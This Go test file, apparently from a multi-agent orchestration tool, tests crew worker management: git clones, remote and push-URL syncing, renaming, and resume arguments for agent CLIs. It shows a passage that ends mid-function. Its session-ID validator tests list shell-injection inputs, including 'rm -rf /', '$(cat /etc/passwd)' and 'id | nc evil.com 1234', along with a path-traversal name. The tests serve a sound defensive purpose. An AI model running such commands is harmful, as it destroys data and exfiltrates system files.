package crew

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/steveyegge/gastown/internal/git"
	"github.com/steveyegge/gastown/internal/rig"
)

func TestManagerAddAndGet(t *testing.T) {
	// Create temp directory for test
	tmpDir, err := os.MkdirTemp("", "crew-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Create a mock rig
	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	// Initialize git repo for the rig
	g := git.NewGit(rigPath)

	// For testing, we need a git URL - use a local bare repo
	bareRepoPath := filepath.Join(tmpDir, "bare-repo.git")
	cmd := []string{"git", "init", "--bare", bareRepoPath}
	if err := runCmd(cmd[0], cmd[1:]...); err != nil {
		t.Fatalf("failed to create bare repo: %v", err)
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: bareRepoPath,
	}

	mgr := NewManager(r, g)

	// Test Add
	worker, err := mgr.Add("dave", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	if worker.Name != "dave" {
		t.Errorf("expected name 'dave', got '%s'", worker.Name)
	}
	if worker.Rig != "test-rig" {
		t.Errorf("expected rig 'test-rig', got '%s'", worker.Rig)
	}
	if worker.Branch != "main" {
		t.Errorf("expected branch 'main', got '%s'", worker.Branch)
	}

	// Verify directory structure
	crewDir := filepath.Join(rigPath, "crew", "dave")
	if _, err := os.Stat(crewDir); os.IsNotExist(err) {
		t.Error("crew directory was not created")
	}

	mailDir := filepath.Join(crewDir, "mail")
	if _, err := os.Stat(mailDir); os.IsNotExist(err) {
		t.Error("mail directory was not created")
	}

	// NOTE: CLAUDE.md is NOT created by Add() - it's injected via SessionStart hook
	// See manager.go line 107-110 for why we skip CLAUDE.md creation

	stateFile := filepath.Join(crewDir, "state.json")
	if _, err := os.Stat(stateFile); os.IsNotExist(err) {
		t.Error("state.json was not created")
	}

	// Test Get
	retrieved, err := mgr.Get("dave")
	if err != nil {
		t.Fatalf("Get failed: %v", err)
	}
	if retrieved.Name != "dave" {
		t.Errorf("expected name 'dave', got '%s'", retrieved.Name)
	}

	// Test duplicate Add
	_, err = mgr.Add("dave", false)
	if err != ErrCrewExists {
		t.Errorf("expected ErrCrewExists, got %v", err)
	}

	// Test Get non-existent
	_, err = mgr.Get("nonexistent")
	if err != ErrCrewNotFound {
		t.Errorf("expected ErrCrewNotFound, got %v", err)
	}
}

func TestManagerAddUsesLocalRepoReference(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "crew-test-local-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	remoteRepoPath := filepath.Join(tmpDir, "remote.git")
	if err := runCmd("git", "init", "--bare", remoteRepoPath); err != nil {
		t.Fatalf("failed to create bare repo: %v", err)
	}

	localRepoPath := filepath.Join(tmpDir, "local-repo")
	if err := runCmd("git", "init", localRepoPath); err != nil {
		t.Fatalf("failed to init local repo: %v", err)
	}
	if err := runCmd("git", "-C", localRepoPath, "config", "user.email", "test@test.com"); err != nil {
		t.Fatalf("failed to configure email: %v", err)
	}
	if err := runCmd("git", "-C", localRepoPath, "config", "user.name", "Test"); err != nil {
		t.Fatalf("failed to configure name: %v", err)
	}
	if err := runCmd("git", "-C", localRepoPath, "remote", "add", "origin", remoteRepoPath); err != nil {
		t.Fatalf("failed to add origin: %v", err)
	}

	if err := os.WriteFile(filepath.Join(localRepoPath, "README.md"), []byte("# Test\n"), 0644); err != nil {
		t.Fatalf("failed to write file: %v", err)
	}
	if err := runCmd("git", "-C", localRepoPath, "add", "."); err != nil {
		t.Fatalf("failed to add file: %v", err)
	}
	if err := runCmd("git", "-C", localRepoPath, "commit", "-m", "initial"); err != nil {
		t.Fatalf("failed to commit: %v", err)
	}

	r := &rig.Rig{
		Name:      "test-rig",
		Path:      rigPath,
		GitURL:    remoteRepoPath,
		LocalRepo: localRepoPath,
	}

	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("dave", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	alternates := filepath.Join(worker.ClonePath, ".git", "objects", "info", "alternates")
	if _, err := os.Stat(alternates); err != nil {
		t.Fatalf("expected alternates file: %v", err)
	}
}

func TestManagerAddWithBranch(t *testing.T) {
	// Create temp directory for test
	tmpDir, err := os.MkdirTemp("", "crew-test-branch-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Create a mock rig
	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	g := git.NewGit(rigPath)

	// Create a local repo with initial commit for branch testing
	sourceRepoPath := filepath.Join(tmpDir, "source-repo")
	if err := os.MkdirAll(sourceRepoPath, 0755); err != nil {
		t.Fatalf("failed to create source repo dir: %v", err)
	}

	// Initialize source repo with a commit
	cmds := [][]string{
		{"git", "-C", sourceRepoPath, "init"},
		{"git", "-C", sourceRepoPath, "config", "user.email", "test@test.com"},
		{"git", "-C", sourceRepoPath, "config", "user.name", "Test"},
	}
	for _, cmd := range cmds {
		if err := runCmd(cmd[0], cmd[1:]...); err != nil {
			t.Fatalf("failed to run %v: %v", cmd, err)
		}
	}

	// Create initial file and commit
	testFile := filepath.Join(sourceRepoPath, "README.md")
	if err := os.WriteFile(testFile, []byte("# Test"), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	cmds = [][]string{
		{"git", "-C", sourceRepoPath, "add", "."},
		{"git", "-C", sourceRepoPath, "commit", "-m", "Initial commit"},
	}
	for _, cmd := range cmds {
		if err := runCmd(cmd[0], cmd[1:]...); err != nil {
			t.Fatalf("failed to run %v: %v", cmd, err)
		}
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: sourceRepoPath,
	}

	mgr := NewManager(r, g)

	// Test Add with branch
	worker, err := mgr.Add("emma", true)
	if err != nil {
		t.Fatalf("Add with branch failed: %v", err)
	}

	if worker.Branch != "crew/emma" {
		t.Errorf("expected branch 'crew/emma', got '%s'", worker.Branch)
	}
}

func TestManagerList(t *testing.T) {
	// Create temp directory for test
	tmpDir, err := os.MkdirTemp("", "crew-test-list-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Create a mock rig
	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	g := git.NewGit(rigPath)

	// Create a bare repo for cloning
	bareRepoPath := filepath.Join(tmpDir, "bare-repo.git")
	if err := runCmd("git", "init", "--bare", bareRepoPath); err != nil {
		t.Fatalf("failed to create bare repo: %v", err)
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: bareRepoPath,
	}

	mgr := NewManager(r, g)

	// Initially empty
	workers, err := mgr.List()
	if err != nil {
		t.Fatalf("List failed: %v", err)
	}
	if len(workers) != 0 {
		t.Errorf("expected 0 workers, got %d", len(workers))
	}

	// Add some workers
	_, err = mgr.Add("alice", false)
	if err != nil {
		t.Fatalf("Add alice failed: %v", err)
	}
	_, err = mgr.Add("bob", false)
	if err != nil {
		t.Fatalf("Add bob failed: %v", err)
	}

	workers, err = mgr.List()
	if err != nil {
		t.Fatalf("List failed: %v", err)
	}
	if len(workers) != 2 {
		t.Errorf("expected 2 workers, got %d", len(workers))
	}

	// Create a dot-prefixed directory (e.g. .claude) — should be skipped
	dotDir := filepath.Join(rigPath, "crew", ".claude")
	if err := os.MkdirAll(dotDir, 0755); err != nil {
		t.Fatalf("failed to create .claude dir: %v", err)
	}

	workers, err = mgr.List()
	if err != nil {
		t.Fatalf("List failed after adding dot dir: %v", err)
	}
	if len(workers) != 2 {
		t.Errorf("expected 2 workers (dot-prefixed dir should be skipped), got %d", len(workers))
	}
}

func TestManagerRemove(t *testing.T) {
	// Create temp directory for test
	tmpDir, err := os.MkdirTemp("", "crew-test-remove-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Create a mock rig
	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	g := git.NewGit(rigPath)

	// Create a bare repo for cloning
	bareRepoPath := filepath.Join(tmpDir, "bare-repo.git")
	if err := runCmd("git", "init", "--bare", bareRepoPath); err != nil {
		t.Fatalf("failed to create bare repo: %v", err)
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: bareRepoPath,
	}

	mgr := NewManager(r, g)

	// Add a worker
	_, err = mgr.Add("charlie", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	// Remove it (with force since CLAUDE.md is uncommitted)
	err = mgr.Remove("charlie", true)
	if err != nil {
		t.Fatalf("Remove failed: %v", err)
	}

	// Verify it's gone
	_, err = mgr.Get("charlie")
	if err != ErrCrewNotFound {
		t.Errorf("expected ErrCrewNotFound, got %v", err)
	}

	// Remove non-existent
	err = mgr.Remove("nonexistent", false)
	if err != ErrCrewNotFound {
		t.Errorf("expected ErrCrewNotFound, got %v", err)
	}
}

func TestManagerGetWithStaleStateName(t *testing.T) {
	// Regression test: state.json with wrong name should not affect Get() result
	// See: gt-h1w - gt crew list shows wrong names
	tmpDir, err := os.MkdirTemp("", "crew-test-stale-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	r := &rig.Rig{
		Name: "test-rig",
		Path: rigPath,
	}

	mgr := NewManager(r, git.NewGit(rigPath))

	// Manually create a crew directory with wrong name in state.json
	crewDir := filepath.Join(rigPath, "crew", "alice")
	if err := os.MkdirAll(crewDir, 0755); err != nil {
		t.Fatalf("failed to create crew dir: %v", err)
	}

	// Write state.json with wrong name (simulates stale/copied state)
	stateFile := filepath.Join(crewDir, "state.json")
	staleState := `{"name": "bob", "rig": "test-rig", "clone_path": "/wrong/path"}`
	if err := os.WriteFile(stateFile, []byte(staleState), 0644); err != nil {
		t.Fatalf("failed to write state file: %v", err)
	}

	// Get should return correct name (alice) not stale name (bob)
	worker, err := mgr.Get("alice")
	if err != nil {
		t.Fatalf("Get failed: %v", err)
	}

	if worker.Name != "alice" {
		t.Errorf("expected name 'alice', got '%s' (stale state.json not overridden)", worker.Name)
	}

	expectedPath := filepath.Join(rigPath, "crew", "alice")
	if worker.ClonePath != expectedPath {
		t.Errorf("expected clone_path '%s', got '%s'", expectedPath, worker.ClonePath)
	}
}

func TestManagerAddSyncsRemotesFromRig(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "crew-test-remotes-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	// Create a "fork" bare repo (what origin should point to)
	forkRepoPath := filepath.Join(tmpDir, "fork.git")
	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
		t.Fatalf("failed to create fork repo: %v", err)
	}

	// Create an "upstream" bare repo
	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
		t.Fatalf("failed to create upstream repo: %v", err)
	}

	// Create mayor/rig with both remotes configured
	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
	if err := runCmd("git", "clone", forkRepoPath, mayorRigPath); err != nil {
		t.Fatalf("failed to clone mayor rig: %v", err)
	}
	if err := runCmd("git", "-C", mayorRigPath, "remote", "add", "upstream", upstreamRepoPath); err != nil {
		t.Fatalf("failed to add upstream to mayor: %v", err)
	}

	// Rig GitURL uses upstream (simulating the bug — clone from upstream)
	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: upstreamRepoPath,
	}

	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("sync_test", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	// Verify crew clone's origin was updated to match mayor/rig's origin (the fork)
	crewGit := git.NewGit(worker.ClonePath)
	originURL, err := crewGit.RemoteURL("origin")
	if err != nil {
		t.Fatalf("failed to get crew origin URL: %v", err)
	}
	if originURL != forkRepoPath {
		t.Errorf("crew origin = %q, want %q (should match mayor/rig)", originURL, forkRepoPath)
	}

	// Verify upstream remote was added
	upstreamURL, err := crewGit.RemoteURL("upstream")
	if err != nil {
		t.Fatalf("failed to get crew upstream URL: %v", err)
	}
	if upstreamURL != upstreamRepoPath {
		t.Errorf("crew upstream = %q, want %q", upstreamURL, upstreamRepoPath)
	}
}

func TestManagerRenameValidatesNewName(t *testing.T) {
	// Regression test: Rename must validate newName to prevent path traversal
	// and invalid characters. See: gt-gt3zv
	tmpDir, err := os.MkdirTemp("", "crew-test-rename-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	g := git.NewGit(rigPath)

	bareRepoPath := filepath.Join(tmpDir, "bare-repo.git")
	if err := runCmd("git", "init", "--bare", bareRepoPath); err != nil {
		t.Fatalf("failed to create bare repo: %v", err)
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: bareRepoPath,
	}

	mgr := NewManager(r, g)

	// Add a valid worker
	_, err = mgr.Add("alice", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	// Attempt renames with invalid names - all should fail
	invalidNames := []string{
		"../../../etc",
		"bad-name",
		"has.dot",
		"has space",
		"..",
		".",
		"",
		"path/sep",
	}

	for _, name := range invalidNames {
		err := mgr.Rename("alice", name)
		if err == nil {
			t.Errorf("Rename to %q should have failed but succeeded", name)
		}
		if err != nil && !errors.Is(err, ErrInvalidCrewName) {
			t.Errorf("Rename to %q: expected ErrInvalidCrewName, got %v", name, err)
		}
	}

	// Valid rename should succeed
	err = mgr.Rename("alice", "bob")
	if err != nil {
		t.Errorf("Rename to 'bob' should have succeeded: %v", err)
	}

	// Verify alice no longer exists and bob does
	_, err = mgr.Get("alice")
	if err != ErrCrewNotFound {
		t.Errorf("expected ErrCrewNotFound for alice, got %v", err)
	}
	worker, err := mgr.Get("bob")
	if err != nil {
		t.Errorf("Get bob failed: %v", err)
	}
	if worker != nil && worker.Name != "bob" {
		t.Errorf("expected name 'bob', got %q", worker.Name)
	}
}

func TestValidateSessionID(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		id      string
		wantErr bool
	}{
		// Valid cases
		{name: "empty string", id: "", wantErr: false},
		{name: "last sentinel", id: "last", wantErr: false},
		{name: "UUID format", id: "01234567-89ab-cdef-0123-456789abcdef", wantErr: false},
		{name: "hex string", id: "a1b2c3d4e5f6", wantErr: false},
		{name: "alphanumeric", id: "session123", wantErr: false},
		{name: "with underscores", id: "my_session_id", wantErr: false},
		{name: "with dots", id: "session.v2.3", wantErr: false},
		{name: "mixed", id: "Claude-Session_01.abc", wantErr: false},

		// Shell injection attempts — all must be rejected
		{name: "semicolon injection", id: "; rm -rf /", wantErr: true},
		{name: "backtick injection", id: "`whoami`", wantErr: true},
		{name: "dollar expansion", id: "$(cat /etc/passwd)", wantErr: true},
		{name: "pipe injection", id: "id | nc evil.com 1234", wantErr: true},
		{name: "ampersand", id: "foo && rm -rf /", wantErr: true},
		{name: "single quote", id: "'; drop table;--", wantErr: true},
		{name: "double quote", id: `"id"`, wantErr: true},
		{name: "newline", id: "foo\nbar", wantErr: true},
		{name: "space", id: "foo bar", wantErr: true},
		{name: "redirect", id: "foo>/tmp/pwned", wantErr: true},
		{name: "hash comment", id: "foo#comment", wantErr: true},
		{name: "tilde", id: "~/evil", wantErr: true},
		{name: "slash", id: "path/traversal", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := validateSessionID(tt.id)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateSessionID(%q) error = %v, wantErr = %v", tt.id, err, tt.wantErr)
			}
		})
	}
}

func TestStartOptionsResumeValidation(t *testing.T) {
	t.Parallel()

	// Verify that Start() rejects invalid session IDs early.
	// We can't test the full Start() flow without tmux, but we can test
	// that the validation function correctly gates the session ID.
	tests := []struct {
		name    string
		id      string
		wantErr bool
	}{
		{name: "valid UUID", id: "abc-123-def", wantErr: false},
		{name: "injection attempt", id: "; rm -rf /", wantErr: true},
		{name: "backtick injection", id: "`evil`", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := validateSessionID(tt.id)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateSessionID(%q) = %v, wantErr %v", tt.id, err, tt.wantErr)
			}
		})
	}
}

func TestBuildResumeArgs(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		agent     string
		sessionID string
		wantArgs  string
		wantErr   string
	}{
		// Claude: has ContinueFlag, flag-style resume
		{
			name:      "claude last uses --continue",
			agent:     "claude",
			sessionID: "last",
			wantArgs:  "--continue",
		},
		{
			name:      "claude specific ID uses --resume with ID",
			agent:     "claude",
			sessionID: "abc-123-def",
			wantArgs:  "--resume abc-123-def",
		},
		// Gemini: no ContinueFlag, flag-style resume
		{
			name:      "gemini last errors without ContinueFlag",
			agent:     "gemini",
			sessionID: "last",
			wantErr:   "does not support --resume without a session ID",
		},
		{
			name:      "gemini specific ID works",
			agent:     "gemini",
			sessionID: "sess-456",
			wantArgs:  "--resume sess-456",
		},
		// Kiro: has ContinueFlag and flag-style session ID resume
		{
			name:      "kiro last uses --resume",
			agent:     "kiro",
			sessionID: "last",
			wantArgs:  "--resume",
		},
		{
			name:      "kiro specific ID uses --resume-id",
			agent:     "kiro",
			sessionID: "f2946a26-3735-4b08-8d05-c928010302d5",
			wantArgs:  "--resume-id f2946a26-3735-4b08-8d05-c928010302d5",
		},
		// Codex: subcommand-style resume
		{
			name:      "codex rejected as subcommand-style",
			agent:     "codex",
			sessionID: "last",
			wantErr:   "subcommand-style agents",
		},
		{
			name:      "codex specific ID also rejected",
			agent:     "codex",
			sessionID: "abc-123",
			wantErr:   "subcommand-style agents",
		},
		// Cursor: no ContinueFlag, flag-style resume
		{
			name:      "cursor last errors without ContinueFlag",
			agent:     "cursor",
			sessionID: "last",
			wantErr:   "does not support --resume without a session ID",
		},
		{
			name:      "cursor specific ID works",
			agent:     "cursor",
			sessionID: "chat-789",
			wantArgs:  "--resume chat-789",
		},
		// OpenCode: no resume support at all
		{
			name:      "opencode rejected no resume support",
			agent:     "opencode",
			sessionID: "last",
			wantErr:   "does not support session resume",
		},
		// Unknown agent
		{
			name:      "unknown agent rejected",
			agent:     "nonexistent",
			sessionID: "abc",
			wantErr:   "does not support session resume",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, err := buildResumeArgs(tt.agent, tt.sessionID)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got nil", tt.wantErr)
				}
				if got := err.Error(); !strings.Contains(got, tt.wantErr) {
					t.Errorf("error %q does not contain %q", got, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.wantArgs {
				t.Errorf("buildResumeArgs(%q, %q) = %q, want %q", tt.agent, tt.sessionID, got, tt.wantArgs)
			}
		})
	}
}

func TestManagerAddSyncsCustomPushURLFromRig(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "crew-test-push-url-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
	forkRepoPath := filepath.Join(tmpDir, "fork.git")
	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
		t.Fatalf("failed to create upstream bare repo: %v", err)
	}
	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
		t.Fatalf("failed to create fork bare repo: %v", err)
	}

	// Create mayor clone with fetch=upstream and push=fork.
	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
		t.Fatalf("failed to create mayor dir: %v", err)
	}
	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
		t.Fatalf("failed to clone mayor rig: %v", err)
	}
	if err := runCmd("git", "-C", mayorRigPath, "remote", "set-url", "origin", "--push", forkRepoPath); err != nil {
		t.Fatalf("failed to set mayor push url: %v", err)
	}

	r := &rig.Rig{
		Name:    "test-rig",
		Path:    rigPath,
		GitURL:  upstreamRepoPath,
		PushURL: forkRepoPath, // config.json is the source of truth for origin push URL
	}
	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("dave", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	crewRepo := worker.ClonePath
	outFetch, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch)
	}
	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
	}

	fetchURL := strings.TrimSpace(string(outFetch))
	pushURL := strings.TrimSpace(string(outPush))

	if fetchURL != upstreamRepoPath {
		t.Errorf("crew fetch URL = %q, want %q", fetchURL, upstreamRepoPath)
	}
	if pushURL != forkRepoPath {
		t.Errorf("crew push URL = %q, want %q", pushURL, forkRepoPath)
	}
}

func TestManagerAddSyncsFallbackPushURLFromConfig(t *testing.T) {
	// When mayor has NO custom push URL but Rig.PushURL is set (from config.json),
	// the crew clone should receive the push URL via the config fallback path.
	tmpDir, err := os.MkdirTemp("", "crew-test-push-fallback-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
	forkRepoPath := filepath.Join(tmpDir, "fork.git")
	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
		t.Fatalf("failed to create upstream bare repo: %v", err)
	}
	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
		t.Fatalf("failed to create fork bare repo: %v", err)
	}

	// Create mayor clone pointing to upstream — NO custom push URL on mayor.
	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
		t.Fatalf("failed to create mayor dir: %v", err)
	}
	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
		t.Fatalf("failed to clone mayor rig: %v", err)
	}
	// Intentionally NOT setting push URL on mayor — this tests the fallback path.

	// Rig has PushURL set (as if loaded from config.json)
	r := &rig.Rig{
		Name:    "test-rig",
		Path:    rigPath,
		GitURL:  upstreamRepoPath,
		PushURL: forkRepoPath,
	}
	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("eve", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	crewRepo := worker.ClonePath
	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
	}

	pushURL := strings.TrimSpace(string(outPush))
	if pushURL != forkRepoPath {
		t.Errorf("crew push URL = %q, want %q (expected config.json fallback)", pushURL, forkRepoPath)
	}
}

func TestManagerAddNoPushURLWhenConfigEmpty(t *testing.T) {
	// When Rig.PushURL is empty and mayor has no custom push URL,
	// crew clone should NOT have a custom push URL (push URL == fetch URL).
	tmpDir, err := os.MkdirTemp("", "crew-test-no-push-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
		t.Fatalf("failed to create upstream bare repo: %v", err)
	}

	// Create mayor clone with NO custom push URL.
	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
		t.Fatalf("failed to create mayor dir: %v", err)
	}
	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
		t.Fatalf("failed to clone mayor rig: %v", err)
	}

	r := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: upstreamRepoPath,
		// PushURL intentionally empty
	}
	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("alice", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	crewRepo := worker.ClonePath
	outFetch, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch)
	}
	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
	}

	fetchURL := strings.TrimSpace(string(outFetch))
	pushURL := strings.TrimSpace(string(outPush))

	// Push URL should equal fetch URL (no custom push URL configured)
	if pushURL != fetchURL {
		t.Errorf("crew push URL = %q, want %q (should match fetch URL when no push_url configured)", pushURL, fetchURL)
	}
}

func TestManagerAddClearsStalePushURLOnSync(t *testing.T) {
	// When Rig.PushURL is empty but a crew clone already has a custom push URL,
	// sync should clear the stale push URL so push matches fetch.
	tmpDir, err := os.MkdirTemp("", "crew-test-clear-push-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	rigPath := filepath.Join(tmpDir, "test-rig")
	if err := os.MkdirAll(rigPath, 0755); err != nil {
		t.Fatalf("failed to create rig dir: %v", err)
	}

	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
	forkRepoPath := filepath.Join(tmpDir, "fork.git")
	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
		t.Fatalf("failed to create upstream bare repo: %v", err)
	}
	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
		t.Fatalf("failed to create fork bare repo: %v", err)
	}

	// Create mayor clone (no custom push URL on mayor)
	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
		t.Fatalf("failed to create mayor dir: %v", err)
	}
	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
		t.Fatalf("failed to clone mayor rig: %v", err)
	}

	// Step 1: Create crew with a push URL configured (simulating previous config)
	r := &rig.Rig{
		Name:    "test-rig",
		Path:    rigPath,
		GitURL:  upstreamRepoPath,
		PushURL: forkRepoPath, // Initially configured
	}
	mgr := NewManager(r, git.NewGit(rigPath))

	worker, err := mgr.Add("staletest", false)
	if err != nil {
		t.Fatalf("Add failed: %v", err)
	}

	// Verify push URL was set
	crewRepo := worker.ClonePath
	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
	}
	pushURL := strings.TrimSpace(string(outPush))
	if pushURL != forkRepoPath {
		t.Fatalf("expected push URL %q, got %q", forkRepoPath, pushURL)
	}

	// Step 2: Create a new manager with empty PushURL (simulating push_url removal from config)
	// and call syncRemotesFromRig on the SAME crew clone to exercise in-place clearing.
	r2 := &rig.Rig{
		Name:   "test-rig",
		Path:   rigPath,
		GitURL: upstreamRepoPath,
		// PushURL intentionally empty — simulates config change
	}
	mgr2 := NewManager(r2, git.NewGit(rigPath))

	// Sync the existing crew clone in-place (not a new clone)
	if err := mgr2.syncRemotesFromRig(crewRepo); err != nil {
		t.Fatalf("syncRemotesFromRig failed: %v", err)
	}

	// Verify push URL was cleared on the same crew clone
	outFetch2, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
	if err != nil {
		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch2)
	}
	outPush2, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
	if err != nil {
